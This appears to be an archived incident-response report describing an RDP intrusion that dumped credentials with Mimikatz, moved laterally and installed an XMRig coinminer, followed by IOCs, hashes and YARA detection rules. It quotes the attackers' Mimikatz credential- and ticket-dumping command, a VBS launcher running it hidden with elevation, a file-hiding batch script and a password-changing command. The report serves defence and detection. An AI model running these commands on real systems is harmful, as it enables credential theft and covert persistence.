{
    "id": "67ec8b5a-3d79-4141-9e5f-2673344a1337",
    "created_at": "2023-01-12T15:07:10.135501Z",
    "updated_at": "2025-03-27T02:05:40.233566Z",
    "deleted_at": null,
    "sha1_hash": "1f3f65e6b573a0665c1f4256c4b5522b8be21d33",
    "title": "2021-01-18 - All That for a Coinminer-",
    "authors": "",
    "file_creation_date": "2022-05-28T18:02:52Z",
    "file_modification_date": "2022-05-28T18:02:52Z",
    "file_size": 325914,
    "plain_text": "# All That for a Coinminer?\n\n**thedfirreport.com/2021/01/18/all-that-for-a-coinminer/**\n\nJanuary 18, 2021\n\n#### A threat actor recently brute forced a local administrator password using RDP and then dumped credentials using Mimikatz. They not only dumped LogonPasswords but they also exported all Kerberos tickets. The threat actor used Advanced IP Scanner to scan the environment before RDPing into multiple systems, including a Domain Controller. After an hour of moving around the environment, they deployed XMRig on the initial compromised system before logging off. The threat actor was active on the network for about 2 hours in total.\n\n### MITRE ATT&CK\n\n Initial Access\n\n#### The threat actor logged in using RDP from an IP (92.118.13[.]103) that hadn’t attempted any previous logins. The account was created the previous day using a source IP of 54.38.67[.]132, which had been trying to brute force a local admin password. The threat actor used a workstation named winstation. During the intrusion, the threat actors also used 5.122.15[.]138 to login to one of the systems.\n\n\n-----\n\n### Execution\n\n#### The threat actor copied svshost.exe to C:\\naz\\naz and then executed it. This PE creates “XMRig CPU mine.exe” and HideAll.bat in C:\\Windows\\PolicyDefinitions and then executes both of them.\n\n### Defense Evasion\n\n#### The PE file that installs XMRig (svshost.exe) also has a script (HideAll.bat) imbedded in it, which is called at runtime. This is the contents of that batch file.\n```\nattrib +h svshost.exe\nattrib +h XMRig CPU mine.exe\nattrib +h config.json\nattrib +h HideAll.bat\nattrib +h xmrig-notls.exe\n\n This script is copied to C:\\Windows\\PolicyDefitions\\ and run, which causes the files specified to be hidden.\n\n## Persistence\n\n#### Before the threat actor disconnected, they changed the user password.\nnet user %USERNAME% ehs.123\n\n## Credential Access\n\n```\n\n-----\n\n#### Mimikatz was used to dump credentials from memory, as well as, export Kerberos tickets using the following command:\n```\nmimikatz.exe\", \"\"\"log\"\" \"\"privilege::debug\"\" \"\"sekurlsa::logonpasswords\"\"\n\"\"sekurlsa::tickets /export\"\" \"\"exit\"\"\"\n\n The threat actors used a vbs script named launch to execute mimikatz. This is the content of launch.vbs\nset shell=CreateObject(\"Shell.Application\")\nshell.ShellExecute \"mimikatz.exe\", \"\"\"log\"\" \"\"privilege::debug\"\"\n\"\"sekurlsa::logonpasswords\"\" \"\"sekurlsa::tickets /export\"\" \"\"exit\"\"\", \"\", \"runas\", 0\nset shell=nothing\n\n Since the log parameter was used, the output was saved to mimikatz.log\n\n The Kerberos tickets were saved to disk, due to the threat actor using sekurlsa::tickets /export.\n\n### Discovery\n\n#### Advanced IP Scanner was used to scan the environment.\n\n```\n\n-----\n\n#### Task manager was opened multiple times. Possibly looking at logged in users and/or processes.\n\n Net Accounts was used to review user policies.\n```\nnet accounts\n\n```\n\n-----\n\n#### masscan and masscan gui were dropped but were not executed.\n\n### Lateral Movement\n\n#### RDP was used to move laterally to multiple machines in the environment, which included domain controllers, backup machines, etc.\n\n### Command and Control\n\n#### RDP was used to access the environment, as well as move within the environment.\n\n### Impact\n\n#### XMRig was running on the system, using some CPU but not enough to cause any issues. We tend to block mining endpoints, which may have lessened the impact of this intrusion. XMRig made connection attempts to 104.140.201[.]42 & 104.142.244[.]186.\n\n The threat actors have been using the associated Monero wallet for 738+ days and have netted around $5,159.\n\n\n-----\n\n#### Was the threat actors’ mission to mine Monero? Or was this a recon mission? Possibly both?\n\n Enjoy our report? Please consider donating $1 or more to the project using Patreon. Thank you for your support!\n\n We also have pcaps, files, and Kape packages available here. No memory captures are available for this case.\n\n### IOCs\n\n#### MISP https://misppriv.circl.lu/events/view/81975 & OTX https://otx.alienvault.com/pulse/60062031b621e8e94a93ff36\n\n### Network\n```\n92.118.13.103\n54.38.67.132\n5.122.15.138\n104.140.201.42\n104.142.244.186\n\n File\n\n#### svshost.exe https://www.hybrid- analysis.com/sample/ba94d5539a4ed65ac7a94a971dbb463a469f8671c767f515d271223078 983442/5e4357ce225259716f52ff7a\n\n```\n\n-----\n\n```\nsvshost.exe\n81a4bc7617cee5761fd883413a1a26d3\nf63b9e779dc48d49bb13ba0a2c31520d12cf2643\nba94d5539a4ed65ac7a94a971dbb463a469f8671c767f515d271223078983442\nmasscan.exe\nc50f3b0b23dfe5c66561bb9297bf7bbc\n5f14241aea174608a7c85127fdad042d7382277d\nde903a297afc249bb7d68fef6c885a4c945d740a487fe3e9144a8499a7094131\nmimikatz.exe\n624ce5a34d00abe90023ddfe54be9269\n0b557b7f5740d2de4f023591a8222b1c0eef7bd1\n99d8d56435e780352a8362dd5cb3857949c6ff5585e81b287527cd6e52a092c1\nXMRig CPU mine.exe\nab7bd2b83f10283b39ec8ea66d31429a\nd21c587aff0347360ef7248f27458718e82157fb\na8b2e85b3e0f5de4b82a92b3ca56d2d889a30383a3f9283ae48aec879edd0376\n\n## Detections\n\n### Network\n[1:2024792:4] ET POLICY Cryptocurrency Miner Checkin\n[1:2826930:3] ETPRO POLICY XMR CoinMiner Usage\n[1:2841079:1] ETPRO TROJAN CoinMiner Known Malicious Stratum Authline (2020-02-18 2)\n\n Sigma\n\n#### Custom created Sigma rule\nhttps://github.com/The-DFIR-Report/SigmaRules/blob/main/Mimikatz_Command_Line_With_Ticket_Export\n\n### Yara\n\n```\n\n-----\n\n```\n/\nYARA Rule Set\nAuthor: The DFIR Report\nDate: 2021-01-18\nIdentifier: Case 1014\nReference: https://thedfirreport.com\n*/\n/* Rule Set ----------------------------------------------------------------- */\nimport \"pe\"\nrule miner_exe_svshost {\nmeta:\ndescription = \"exe - file svshost.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-01-18\"\nhash1 = \"ba94d5539a4ed65ac7a94a971dbb463a469f8671c767f515d271223078983442\"\nstrings:\n$s1 = \"* The error occured in hwloc %s inside process `%s', while\" fullword ascii\n$s2 = \"__kernel void find_shares(__global const uint64_t* hashes,uint64_t\ntarget,uint32_t start_nonce,__global uint32_t* shares)\" fullword ascii\n$s3 = \"lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral,\nPublicKeyToken=b77a5c561934e089#System.Resources.R\" ascii\n$s4 = \"svshost.exe\" fullword wide\n$s5 = \"Could not read dumped cpuid file %s, ignoring cpuiddump.\" fullword ascii\n$s6 = \"%PROGRAMFILES%\\\\NVIDIA Corporation\\\\NVSMI\\\\nvml.dll\" fullword ascii\n$s7 = \"void blake2b_512_process_single_block(ulong *h,const ulong* m,uint\nblockTemplateSize)\" fullword ascii\n$s8 = \"* the input XML was generated by hwloc %s inside process `%s'.\" fullword ascii\n$s9 = \"blake2b_512_process_single_block(hash,m,blockTemplateSize);\" fullword ascii\n$s10 = \"F:\\\\Apps\\\\cSharp\\\\myMinerup\\\\myM\\\\myM\\\\obj\\\\Debug\\\\svshost.pdb\" fullword\nascii\n$s11 = \"|attrib +h svshost.exe\" fullword ascii\n$s12 = \"Found non-x86 dumped cpuid summary in %s: %s\" fullword ascii\n$s13 = \"GetCurrentProcessorNumberExProc || (GetCurrentProcessorNumberProc &&\nnr_processor_groups == 1)\" fullword ascii\n$s14 = \"__kernel void blake2b_initial_hash(__global void *out,__global const void*\nblockTemplate,uint blockTemplateSize,uint start_nonce\" ascii\n$s15 = \"* hwloc %s received invalid information from the operating system.\" fullword\nascii\n$s16 = \"__local exec_t* execution_plan=(__local exec_t*)(execution_plan_buf+\n(get_local_id(0)/8)*RANDOMX_PROGRAM_SIZE*WORKERS_PER_HASH*si\" ascii\n$s17 = \"__kernel void execute_vm(__global void* vm_states,__global void*\nrounding,__global void* scratchpads,__global const void* datase\" ascii\n$s18 = \"__kernel void execute_vm(__global void* vm_states,__global void*\nrounding,__global void* scratchpads,__global const void* datase\" ascii\n$s19 = \"__local exec_t* execution_plan=(__local exec_t*)(execution_plan_buf+\n(get_local_id(0)/8)*RANDOMX_PROGRAM_SIZE*WORKERS_PER_HASH*si\" ascii\n$s20 = \"__kernel void blake2b_initial_hash(__global void *out,__global const void*\nblockTemplate,uint blockTemplateSize,uint start_nonce\" ascii\ncondition:\n\n```\n\n-----\n\n```\nuint16(0)  0x5a4d and filesize < 19000KB and\n8 of them\n}\nrule mimikatz_1014 {\nmeta:\ndescription = \"exe - file mimikatz.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-01-18\"\nhash1 = \"99d8d56435e780352a8362dd5cb3857949c6ff5585e81b287527cd6e52a092c1\"\nstrings:\n$x1 = \"ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM\nAccounts (0x%08x)\" fullword wide\n$x2 = \"ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx user\n(%s)\" fullword wide\n$x3 = \"ERROR kuhl_m_lsadump_lsa ;\nkull_m_process_getVeryBasicModuleInformationsForName (0x%08x)\" fullword wide\n$x4 = \"ERROR kuhl_m_lsadump_getComputerAndSyskey ; kull_m_registry_RegOpenKeyEx LSA\nKO\" fullword wide\n$x5 = \"ERROR kuhl_m_lsadump_dcsync ; kull_m_rpc_drsr_ProcessGetNCChangesReply\"\nfullword wide\n$x6 = \"ERROR kuhl_m_lsadump_trust ;\nkull_m_process_getVeryBasicModuleInformationsForName (0x%08x)\" fullword wide\n$x7 = \"ERROR kuhl_m_lsadump_getUsersAndSamKey ; kuhl_m_lsadump_getSamKey KO\" fullword\nwide\n$x8 = \"ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x%08x)\" fullword wide\n$x9 = \"ERROR kuhl_m_lsadump_netsync ; I_NetServerTrustPasswordsGet (0x%08x)\" fullword\nwide\n$x10 = \"ERROR kuhl_m_dpapi_chrome ; Input 'Login Data' file needed\n(/in:\\\"%%localappdata%%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Da\" wide\n$x11 = \"ERROR kuhl_m_kernel_processProtect ; Argument /process:program.exe or\n/pid:processid needed\" fullword wide\n$x12 = \"ERROR kuhl_m_lsadump_getHash ; Unknow SAM_HASH revision (%hu)\" fullword wide\n$x13 = \"ERROR kuhl_m_lsadump_sam ; kull_m_registry_RegOpenKeyEx (SAM) (0x%08x)\"\nfullword wide\n$x14 = \"ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; Checksums don't\nmatch (C:0x%08x - R:0x%08x)\" fullword wide\n$x15 = \"ERROR kuhl_m_lsadump_enumdomains_users ; /user or /rid is needed\" fullword\nwide\n$x16 = \"ERROR kuhl_m_lsadump_changentlm ; Argument /oldpassword: or /oldntlm: is\nneeded\" fullword wide\n$x17 = \"livessp.dll\" fullword wide /* reversed goodware string 'lld.pssevil' */\n$x18 = \"ERROR kuhl_m_lsadump_enumdomains_users ; SamLookupNamesInDomain: %08x\"\nfullword wide\n$x19 = \"ERROR kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO\"\nfullword wide\n$x20 = \"ERROR kuhl_m_lsadump_getKeyFromGUID ; kuhl_m_lsadump_LsaRetrievePrivateData:\n0x%08x\" fullword wide\ncondition:\nuint16(0) == 0x5a4d and filesize < 3000KB and\n( pe.imphash() == \"a0444dc502edb626311492eb9abac8ec\" or 1 of ($x*) )\n}\n\n```\n\n-----\n\n```\nrule masscan_1014 {\nmeta:\ndescription = \"exe - file masscan.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-01-18\"\nhash1 = \"de903a297afc249bb7d68fef6c885a4c945d740a487fe3e9144a8499a7094131\"\nstrings:\n$x1 = \"User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)\"\nfullword ascii\n$s2 = \"Usage: masscan [Options] -p{Target-Ports} {Target-IP-Ranges}\" fullword ascii\n$s3 = \"GetProcessAffinityMask() returned error %u\" fullword ascii\n$s4 = \"Via: HTTP/1.1 ir14.fp.bf1.yahoo.com (YahooTrafficServer/1.2.0.13 [c s f ])\"\nfullword ascii\n$s5 = \"C:\\\\Documents and Settings\\\\\" fullword ascii\n$s6 = \"android.com\" fullword ascii\n$s7 = \"youtube.com\" fullword ascii\n$s8 = \"espanol.yahoo.com\" fullword ascii\n$s9 = \"brb.yahoo.com\" fullword ascii\n$s10 = \"malaysia.yahoo.com\" fullword ascii\n$s11 = \"att.yahoo.com\" fullword ascii\n$s12 = \"hsrd.yahoo.com\" fullword ascii\n$s13 = \"googlecommerce.com\" fullword ascii\n$s14 = \"maktoob.yahoo.com\" fullword ascii\n$s15 = \"*.youtube-nocookie.com\" fullword ascii\n$s16 = \"# TARGET SELECTION (IP, PORTS, EXCLUDES)\" fullword ascii\n$s17 = \"www.yahoo.com\" fullword ascii\n$s18 = \"x.509 parser failure: google.com\" fullword ascii\n$s19 = \"-- forced options: -sS -Pn -n --randomize-hosts -v --send-eth\" fullword ascii\n$s20 = \"urchin.com\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 700KB and\n( pe.imphash() == \"9b0b559e373d62a1c93e615f003f8af8\" or 10 of them)\n}\nrule XMRig_CPU_mine_1014 {\nmeta:\ndescription = \"exe - file XMRig CPU mine.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-01-18\"\nhash1 = \"a8b2e85b3e0f5de4b82a92b3ca56d2d889a30383a3f9283ae48aec879edd0376\"\nstrings:\n$s1 = \"* The error occured in hwloc %s inside process `%s', while\" fullword ascii\n$s2 = \"__kernel void find_shares(__global const uint64_t* hashes,uint64_t\ntarget,uint32_t start_nonce,__global uint32_t* shares)\" fullword ascii\n$s3 = \"Could not read dumped cpuid file %s, ignoring cpuiddump.\" fullword ascii\n$s4 = \"%PROGRAMFILES%\\\\NVIDIA Corporation\\\\NVSMI\\\\nvml.dll\" fullword ascii\n$s5 = \"void blake2b_512_process_single_block(ulong *h,const ulong* m,uint\nblockTemplateSize)\" fullword ascii\n$s6 = \"* the input XML was generated by hwloc %s inside process `%s'.\" fullword ascii\n$s7 = \"blake2b_512_process_single_block(hash,m,blockTemplateSize);\" fullword ascii\n$s8 = \"Found non-x86 dumped cpuid summary in %s: %s\" fullword ascii\n$s9 = \"GetCurrentProcessorNumberExProc || (GetCurrentProcessorNumberProc &&\nnr_processor_groups == 1)\" fullword ascii\n\n```\n\n-----\n\n```\n$s10 __kernel void blake2b_initial_hash(__global void out,__global const void \nblockTemplate,uint blockTemplateSize,uint start_nonce\" ascii\n$s11 = \"* hwloc %s received invalid information from the operating system.\" fullword\nascii\n$s12 = \"__local exec_t* execution_plan=(__local exec_t*)(execution_plan_buf+\n(get_local_id(0)/8)*RANDOMX_PROGRAM_SIZE*WORKERS_PER_HASH*si\" ascii\n$s13 = \"__kernel void execute_vm(__global void* vm_states,__global void*\nrounding,__global void* scratchpads,__global const void* datase\" ascii\n$s14 = \"__kernel void execute_vm(__global void* vm_states,__global void*\nrounding,__global void* scratchpads,__global const void* datase\" ascii\n$s15 = \"__local exec_t* execution_plan=(__local exec_t*)(execution_plan_buf+\n(get_local_id(0)/8)*RANDOMX_PROGRAM_SIZE*WORKERS_PER_HASH*si\" ascii\n$s16 = \"__kernel void blake2b_initial_hash(__global void *out,__global const void*\nblockTemplate,uint blockTemplateSize,uint start_nonce\" ascii\n$s17 = \"nvml.dll\" fullword ascii\n$s18 = \"__kernel void Groestl(__global ulong *states,__global uint\n*BranchBuf,__global uint *output,ulong Target,uint Threads)\" fullword ascii\n$s19 = \"__kernel void Blake(__global ulong *states,__global uint *BranchBuf,__global\nuint *output,ulong Target,uint Threads)\" fullword ascii\n$s20 = \"__kernel void JH(__global ulong *states,__global uint *BranchBuf,__global\nuint *output,ulong Target,uint Threads)\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 19000KB and\n( pe.imphash() == \"5c21c3e071f2116dcdb008ad5fc936d4\" or 8 of them )\n}\n\n## MITRE\n\n#### Command-Line Interface – T1059\n Create Account – T1136\n Credential Dumping – T1003\n External Remote Services – T1133\n Graphical User Interface – T1061\n Hidden Files and Directories – T1564.001\n Local Account – T1087.001\n Network Service Scanning – T1046\n Remote Services – T1021\n Resource Hijacking – T1496\n\n Internal case 1014\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-18 - All That for a Coinminer-.pdf"
    ],
    "report_names": [
        "2021-01-18 - All That for a Coinminer-.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536030,
    "ts_updated_at": 1743041140,
    "ts_creation_date": 1653760972,
    "ts_modification_date": 1653760972,
    "files": {
        "pdf": "https://archive.orkl.eu/1f3f65e6b573a0665c1f4256c4b5522b8be21d33.pdf",
        "text": "https://archive.orkl.eu/1f3f65e6b573a0665c1f4256c4b5522b8be21d33.txt",
        "img": "https://archive.orkl.eu/1f3f65e6b573a0665c1f4256c4b5522b8be21d33.jpg"
    }
}